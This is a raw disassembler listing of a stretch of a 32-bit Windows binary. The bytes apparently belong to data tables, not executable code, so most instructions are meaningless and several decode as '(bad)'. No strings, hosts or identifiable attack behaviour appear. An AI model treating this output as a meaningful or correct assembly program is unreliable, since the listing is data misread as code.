  4069e4:	01 15 0e 00 5c 00    	add    %edx,0x5c000e
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 40 0c b1    	add    %dl,-0x4ef3c000(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 40 0c             	add    %al,0xc(%eax)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 40 0c             	add    %al,0xc(%eax)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 01 15 0e    	add    %al,0xe150118(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 41 0f             	add    %al,0xf(%ecx)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 5a 0c             	add    %bl,0xc(%edx)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 42 1d             	add    %al,0x1d(%edx)
  406a48:	d2 02                	rolb   %cl,(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 d7 18 da    	add    %dl,-0x25e72900(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 64 10 e8          	add    %ah,-0x18(%eax,%edx,1)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a4 13 f6 02 6e 00 	add    %ah,0x6e02f6(%ebx,%edx,1)
  406a92:	78 20                	js     0x406ab4
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	01 15 0e 00 70 00    	add    %edx,0x70000e
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 67 18             	add    %ah,0x18(%edi)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 5e 18             	add    %bl,0x18(%esi)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c1                	add    %al,%cl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c1                	add    %al,%cl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c1                	add    %al,%cl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c1                	add    %al,%cl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c1                	add    %al,%cl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c1                	add    %al,%cl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c1                	add    %al,%cl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c1                	add    %al,%cl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c1                	add    %al,%cl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b01:	00 4e 13             	add    %cl,0x13(%esi)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b09:	08 00                	or     %al,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 ac 10 00 00 04 00 	add    %ch,0x40000(%eax,%edx,1)
  406b14:	1e                   	push   %ds
  406b15:	18 00                	sbb    %al,(%eax)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 ce                	add    %cl,%dh
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 15 0d 00 00 01    	add    %dl,0x100000d
  406b25:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406b2b:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406b31:	00 25 0d 00 00 01    	add    %ah,0x100000d
  406b37:	00 d0                	add    %dl,%al
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 bf 04 00 00 02    	add    %bh,0x2000004(%edi)
  406b43:	00 05 1c 00 00 03    	add    %al,0x300001c
  406b49:	00 6a 1b             	add    %ch,0x1b(%edx)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	2a 07                	sub    (%edi),%al
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	39 18                	cmp    %ebx,(%eax)
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	28 1b                	sub    %bl,(%ebx)
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	f7 16                	notl   (%esi)
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 4e 13             	add    %cl,0x13(%esi)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	67 0b 00             	or     (%bx,%si),%eax
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 a2 07 00 00 02    	add    %ah,0x2000007(%edx)
  406b8b:	00 c1                	add    %al,%cl
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c1                	add    %al,%cl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b9d:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406ba3:	00 22                	add    %ah,(%edx)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	4d                   	dec    %ebp
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e9                	add    %ch,%cl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406bbb:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406bc1:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406bc7:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406bdf:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406be5:	00 bb 18 00 00 01    	add    %bh,0x1000018(%ebx)
  406beb:	00 4b 16             	add    %cl,0x16(%ebx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	c7                   	(bad)
  406bf3:	16                   	push   %ss
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	c7                   	(bad)
  406bf9:	16                   	push   %ss
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	0a 1c 00             	or     (%eax,%eax,1),%bl
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 0a                	add    %cl,(%edx)
  406c05:	1c 00                	sbb    $0x0,%al
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 0a                	add    %cl,(%edx)
  406c0b:	1c 00                	sbb    $0x0,%al
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 0a                	add    %cl,(%edx)
  406c11:	1c 00                	sbb    $0x0,%al
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 0a                	add    %cl,(%edx)
  406c17:	1c 00                	sbb    $0x0,%al
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406c21:	00 a8 0d 00 00 02    	add    %ch,0x200000d(%eax)
  406c27:	00 b3 0d 00 00 01    	add    %dh,0x100000d(%ebx)
  406c2d:	00 c1                	add    %al,%cl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c1                	add    %al,%cl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c1                	add    %al,%cl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 33                	add    %dh,(%ebx)
  406c41:	1c 00                	sbb    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 c1                	add    %al,%cl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c51:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c57:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406c5d:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406c63:	00 c1                	add    %al,%cl
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c1                	add    %al,%cl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c1                	add    %al,%cl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 00                	add    %al,(%eax)
  406c77:	1d 00 00 02 00       	sbb    $0x20000,%eax
  406c7c:	c1 0a 00             	rorl   $0x0,(%edx)
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 00                	add    %al,(%eax)
  406c83:	1d 00 00 02 00       	sbb    $0x20000,%eax
  406c88:	c1 0a 00             	rorl   $0x0,(%edx)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 21                	add    %ah,(%ecx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	21 07                	and    %eax,(%edi)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	67 0d 00 00 01 00    	addr16 or $0x10000,%eax
  406ca0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 68 0e             	add    %ch,0xe(%eax)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	6d                   	insl   (%dx),%es:(%edi)
  406cad:	0e                   	push   %cs
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	6d                   	insl   (%dx),%es:(%edi)
  406cb3:	0e                   	push   %cs
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	c7                   	(bad)
  406cb9:	16                   	push   %ss
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	21 07                	and    %eax,(%edi)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	b8 17 00 00 01       	mov    $0x1000017,%eax
  406cc9:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406ccf:	00 c1                	add    %al,%cl
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c1                	add    %al,%cl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c1                	add    %al,%cl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406ce7:	00 90 10 00 00 01    	add    %dl,0x1000010(%eax)
  406ced:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406cf3:	00 71 0b             	add    %dh,0xb(%ecx)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	b8 17 00 00 01       	mov    $0x1000017,%eax
  406cff:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406d05:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406d0b:	00 77 0e             	add    %dh,0xe(%edi)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d17:	00 be 16 00 00 01    	add    %bh,0x1000016(%esi)
  406d1d:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406d23:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d2f:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d3b:	00 68 0e             	add    %ch,0xe(%eax)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d47:	00 72 0e             	add    %dh,0xe(%edx)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d53:	00 72 0e             	add    %dh,0xe(%edx)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	bd 1b 00 00 01       	mov    $0x100001b,%ebp
  406d5f:	00 bd 1b 16 00 59    	add    %bh,0x5900161b(%ebp)
  406d65:	00 18                	add    %bl,(%eax)
  406d67:	00 5d 00             	add    %bl,0x0(%ebp)
  406d6a:	b1 00                	mov    $0x0,%cl
  406d6c:	f6 1a                	negb   (%edx)
  406d6e:	bb 01 b1 00 e2       	mov    $0xe200b101,%ebx
  406d73:	1b bf 01 b1 00 c5    	sbb    -0x3aff4eff(%edi),%edi
  406d79:	19 0e                	sbb    %ecx,(%esi)
  406d7b:	00 b9 00 e9 14 64    	add    %bh,0x6414e900(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 01                	add    %al,(%ecx)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	01 15 0e 00 d9 00    	add    %edx,0xd9000e
  406d90:	01 15 2e 03 e9 00    	add    %edx,0xe9032e
  406d96:	01 15 6b 01 f1 00    	add    %edx,0xf1016b
  406d9c:	01 15 6b 01 f9 00    	add    %edx,0xf9016b
  406da2:	01 15 6b 01 01 01    	add    %edx,0x101016b
  406da8:	01 15 6b 01 09 01    	add    %edx,0x109016b
  406dae:	01 15 6b 01 11 01    	add    %edx,0x111016b
  406db4:	01 15 6b 01 19 01    	add    %edx,0x119016b
  406dba:	01 15 6b 01 21 01    	add    %edx,0x121016b
  406dc0:	01 15 6b 01 29 01    	add    %edx,0x129016b
  406dc6:	01 15 6b 01 31 01    	add    %edx,0x131016b
  406dcc:	01 15 4b 02 39 01    	add    %edx,0x139024b
  406dd2:	01 15 0e 00 41 01    	add    %edx,0x141000e
  406dd8:	01 15 6b 01 49 01    	add    %edx,0x149016b
  406dde:	80 12 7f             	adcb   $0x7f,(%edx)
  406de1:	00 51 01             	add    %dl,0x1(%ecx)
  406de4:	6e                   	outsb  %ds:(%esi),(%dx)
  406de5:	00 a8 03 59 01 ef    	add    %ch,-0x10fea6fd(%eax)
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 71 10             	add    %esi,0x10(%ecx)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	01 15 0e 00 61 01    	add    %edx,0x161000e
  406dfc:	37                   	aaa
  406dfd:	01 b1 03 51 01 20    	add    %esi,0x20015103(%ecx)
  406e03:	0c 2a                	or     $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	af                   	scas   %es:(%edi),%eax
  406e09:	0c b7                	or     $0xb7,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 01                	add    %al,(%ecx)
  406e0f:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e14:	d2 1c bd 03 69 01 9d 	rcrb   %cl,-0x62fe96fd(,%edi,4)
  406e1b:	1c c3                	sbb    $0xc3,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	b5 16                	mov    $0x16,%ch
  406e22:	c9                   	leave
  406e23:	03 81 01 e2 01 c7    	add    -0x38fe1dff(%ecx),%eax
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	37                   	aaa
  406e2d:	0d cf 03 19 00       	or     $0x1903cf,%eax
  406e32:	01 15 ed 03 19 00    	add    %edx,0x1903ed
  406e38:	47                   	inc    %edi
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 77             	roll   $0x77,(%ecx)
  406e45:	1d fa 03 c1 01       	sbb    $0x1c103fa,%eax
  406e4a:	e1 19                	loope  0x406e65
  406e4c:	00 04 d1             	add    %al,(%ecx,%edx,8)
  406e4f:	01 01                	add    %eax,(%ecx)
  406e51:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e56:	e6 1b                	out    %al,$0x1b
  406e58:	07                   	pop    %es
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 f2                	add    %esi,%edx
  406e5d:	15 0c 04 19 00       	adc    $0x19040c,%eax
  406e62:	48                   	dec    %eax
  406e63:	19 14 04             	sbb    %edx,(%esp,%eax,1)
  406e66:	19 00                	sbb    %eax,(%eax)
  406e68:	34 03                	xor    $0x3,%al
  406e6a:	bf 01 19 00 48       	mov    $0x48001901,%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 01                	add    %eax,(%ecx)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	01 15 36 02 99 01    	add    %edx,0x1990236
  406e80:	62 17                	bound  %edx,(%edi)
  406e82:	1c 04                	sbb    $0x4,%al
  406e84:	99                   	cltd
  406e85:	01 4b 0c             	add    %ecx,0xc(%ebx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e1             	roll   $0xe1,(%ecx)
  406e8d:	19 23                	sbb    %esp,(%ebx)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 e6                	add    %esp,%esi
  406e93:	1b 2d 04 f1 01 64    	sbb    0x6401f104,%ebp
  406e99:	08 0e                	or     %cl,(%esi)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 01                	add    %eax,(%ecx)
  406e9f:	15 33 04 01 02       	adc    $0x2010433,%eax
  406ea4:	01 15 3a 04 21 00    	add    %edx,0x21043a
  406eaa:	01 15 40 04 19 00    	add    %edx,0x190440
  406eb0:	3a 1b                	cmp    (%ebx),%bl
  406eb2:	4a                   	dec    %edx
  406eb3:	04 09                	add    $0x9,%al
  406eb5:	00 66 0c             	add    %ah,0xc(%esi)
  406eb8:	47                   	inc    %edi
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 76 1a             	add    %dh,0x1a(%esi)
  406ebe:	50                   	push   %eax
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 01                	add    (%ecx),%al
  406ec3:	15 3a 04 29 00       	adc    $0x29043a,%eax
  406ec8:	01 15 5c 04 31 02    	add    %edx,0x231045c
  406ece:	01 15 3a 04 c1 00    	add    %edx,0xc1043a
  406ed4:	07                   	pop    %es
  406ed5:	03 66 04             	add    0x4(%esi),%esp
  406ed8:	39 02                	cmp    %eax,(%edx)
  406eda:	94                   	xchg   %eax,%esp
  406edb:	07                   	pop    %es
  406edc:	73 04                	jae    0x406ee2
  406ede:	31 00                	xor    %eax,(%eax)
  406ee0:	72 17                	jb     0x406ef9
  406ee2:	7a 04                	jp     0x406ee8
  406ee4:	c1 00 64             	roll   $0x64,(%eax)
  406ee7:	08 0e                	or     %cl,(%esi)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 ff                	add    %bh,%bh
  406ef9:	02 85 04 49 02 6e    	add    0x6e024904(%ebp),%al
  406eff:	00 8b 04 c1 00 0c    	add    %cl,0xc00c104(%ebx)
  406f05:	03 92 04 51 02 01    	add    0x1025104(%edx),%edx
  406f0b:	15 3a 04 49 01       	adc    $0x149043a,%eax
  406f10:	01 15 9a 04 49 01    	add    %edx,0x149049a
  406f16:	9f                   	lahf
  406f17:	1b a1 04 61 02 82    	sbb    -0x7dfd9efc(%ecx),%esp
  406f1d:	14 b3                	adc    $0xb3,%al
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 b5 16 9f 01 19    	add    0x19019f16(%ebp),%dh
  406f27:	00 3c 0f             	add    %bh,(%edi,%ecx,1)
  406f2a:	ba 04 c1 00 e2       	mov    $0xe200c104,%edx
  406f2f:	08 c2                	or     %al,%dl
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 01                	add    (%ecx),%al
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	a8 11                	test   $0x11,%al
  406f3c:	15 02 c1 00 42       	adc    $0x4200c102,%eax
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	ef                   	out    %eax,(%dx)
  406f47:	19 9a 00 71 02 40    	sbb    %ebx,0x40027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	ca 15 c7             	lret   $0xc715
  406f55:	00 a1 02 dc 07 e5    	add    %ah,-0x1af823fe(%ecx)
  406f5b:	04 79                	add    $0x79,%al
  406f5d:	02 01                	add    (%ecx),%al
  406f5f:	15 6b 01 81 02       	adc    $0x281016b,%eax
  406f64:	42                   	inc    %edx
  406f65:	18 eb                	sbb    %ch,%bl
  406f67:	04 81                	add    $0x81,%al
  406f69:	02 a2 06 f1 04 a9    	add    -0x56fb0efa(%edx),%ah
  406f6f:	02 eb                	add    %bl,%ch
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 56 07 47    	add    0x47075602(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 83 1d fa 03 81    	add    %eax,-0x7efc05e3(%ebx)
  406f81:	02 e5                	add    %ch,%ah
  406f83:	15 f7 04 81 02       	adc    $0x28104f7,%eax
  406f88:	37                   	aaa
  406f89:	0f 0e                	femms
  406f8b:	00 89 02 01 15 0e    	add    %cl,0xe150102(%ecx)
  406f91:	00 89 02 f8 06 6b    	add    %cl,0x6b06f802(%ecx)
  406f97:	01 b1 02 e2 06 47    	add    %esi,0x4706e202(%ecx)
  406f9d:	02 a1 02 e4 10 c7    	add    -0x38ef1bfe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 bd 18 fe 04 89    	add    %edi,-0x76fb01e8(%ebp)
  406fab:	02 85 18 6b 01 89    	add    -0x76fe94e8(%ebp),%al
  406fb1:	02 bf 06 04 05 89    	add    -0x76fafbfa(%edi),%bh
  406fb7:	02 20                	add    (%eax),%ah
  406fb9:	1c 4b                	sbb    $0x4b,%al
  406fbb:	02 81 02 9f 1b 0b    	add    0xb1b9f02(%ecx),%al
  406fc1:	05 c1 02 5e 14       	add    $0x145e02c1,%eax
  406fc6:	14 05                	adc    $0x5,%al
  406fc8:	c9                   	leave
  406fc9:	02 72 08             	add    0x8(%edx),%dh
  406fcc:	c7 00 91 02 c7 1c    	movl   $0x1cc70291,(%eax)
  406fd2:	19 05 c1 01 bd 18    	sbb    %eax,0x18bd01c1
  406fd8:	23 05 91 02 b8 0a    	and    0xab80291,%eax
  406fde:	2a 05 d9 02 a6 18    	sub    0x18a602d9,%al
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	d2 08                	rorb   %cl,(%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 01                	add    (%ecx),%al
  406fef:	15 30 05 d9 02       	adc    $0x2d90530,%eax
  406ff4:	68 16 2a 01 a1       	push   $0xa1012a16
  406ff9:	02 05 07 c3 00 c1    	add    0xc100c307,%al
  406fff:	01 bd 18 e5 04 99    	add    %edi,-0x66fb1ae8(%ebp)
  407005:	02 01                	add    (%ecx),%al
  407007:	15 6b 01 f1 02       	adc    $0x2f1016b,%eax
  40700c:	d2 07                	rolb   %cl,(%edi)
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 5b 0d             	add    0xd(%ebx),%bl
  407014:	c3                   	ret
  407015:	00 a1 02 15 07 c7    	add    %ah,-0x38f8eafe(%ecx)
  40701b:	00 89 02 05 0d 4b    	add    %cl,0x4b0d0502(%ecx)
  407021:	02 89 02 71 0a 4b    	add    0x4b0a7102(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	ad                   	lods   %ds:(%esi),%eax
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	57                   	push   %edi
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	70 1b                	jo     0x407053
  407038:	c7 00 f9 02 01 15    	movl   $0x150102f9,(%eax)
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 08                	add    (%eax),%cl
  407043:	0b 23                	or     (%ebx),%esp
  407045:	02 01                	add    (%ecx),%al
  407047:	03 01                	add    (%ecx),%eax
  407049:	15 0e 00 01 03       	adc    $0x301000e,%eax
  40704e:	47                   	inc    %edi
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 95 14 47 02 c1    	add    %edx,-0x3efdb8ec(%ebp)
  407059:	01 bf 17 42 02 09    	add    %edi,0x9024217(%edi)
  40705f:	03 01                	add    (%ecx),%eax
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	5a                   	pop    %edx
